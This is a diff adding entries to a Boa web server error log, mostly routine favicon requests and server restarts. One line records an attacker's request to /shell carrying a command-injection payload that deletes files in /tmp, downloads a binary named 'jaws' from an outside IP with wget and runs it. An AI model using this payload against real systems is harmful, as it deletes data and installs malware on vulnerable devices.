@@ -16101,3 +16101,18 @@ buffer flush: Connection reset by peer
 [06/Apr/2023:05:34:57 +0000] malformed request: ""
 [06/Apr/2023:05:34:58 +0000] request from 165.22.218.92 "GET /geoip/ HTTP/1.1" ("/home/boa/www/geoip/"): document open: No such file or directory
 [06/Apr/2023:05:34:58 +0000] request from 165.22.218.92 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:08:07:28 +0000] request from 168.121.55.62 "GET /shell?cd+/tmp;rm+-rf+*;wget+167.71.210.63/jaws;sh+/tmp/jaws HTTP/1.1" ("/home/boa/www/shell"): document open: No such file or directory
+[06/Apr/2023:08:14:53 +0000] request from 45.83.66.99 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:08:17:04 +0000] request from 117.176.187.221 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:08:18:08 +0000] request from 117.176.187.221 "(null)" ("(null)"): connection timed out
+[06/Apr/2023:08:19:28 +0000] caught SIGHUP, restarting
+[06/Apr/2023:08:19:28 +0000] re-reading configuration files
+[06/Apr/2023:08:19:28 +0000] successful restart
+[06/Apr/2023:08:19:28 +0000] caught SIGTERM, starting shutdown
+[06/Apr/2023:08:19:28 +0000] exiting Boa normally (uptime 82048 seconds)
+[06/Apr/2023:08:28:48 +0000] boa: server version Boa/0.94.13
+[06/Apr/2023:08:28:48 +0000] boa: server built Oct 11 2022 at 11:38:52.
+[06/Apr/2023:08:28:48 +0000] boa: starting server pid=1530, port 80
+[06/Apr/2023:08:29:01 +0000] request from 185.187.239.242 "GET /favicon.ico HTTP/1.1" ("/home/boa/www/favicon.ico"): document open: No such file or directory
+[06/Apr/2023:09:09:08 +0000] caught SIGTERM, starting shutdown
+[06/Apr/2023:09:09:08 +0000] exiting Boa normally (uptime 2420 seconds)
